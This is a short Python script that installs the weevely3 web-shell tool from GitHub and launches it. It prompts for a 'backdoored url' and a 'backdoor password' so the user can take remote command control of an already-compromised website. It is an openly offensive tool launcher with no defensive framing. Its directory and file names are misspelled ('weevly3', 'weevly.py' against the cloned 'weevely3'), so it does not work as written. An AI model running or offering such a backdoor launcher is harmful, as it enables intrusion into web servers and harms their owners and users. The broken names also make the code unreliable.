#!/usr/bin/python3

import os
from getpass import getpass

print("Installing weevly3...")
os.system("git clone https://github.com/epinna/weevely3 --recursive")
os.chdir("weevly3")
print("Installing requirements...")
os.system("pip install -r requirements.txt")
sitename = input("Enter backdoored url: ")
passwd = getpass("Enter backdoor password: ")
cmd = "./weevly.py %s %s" % (sitename,passwd)
print("Launching weevly...")
os.system(cmd)
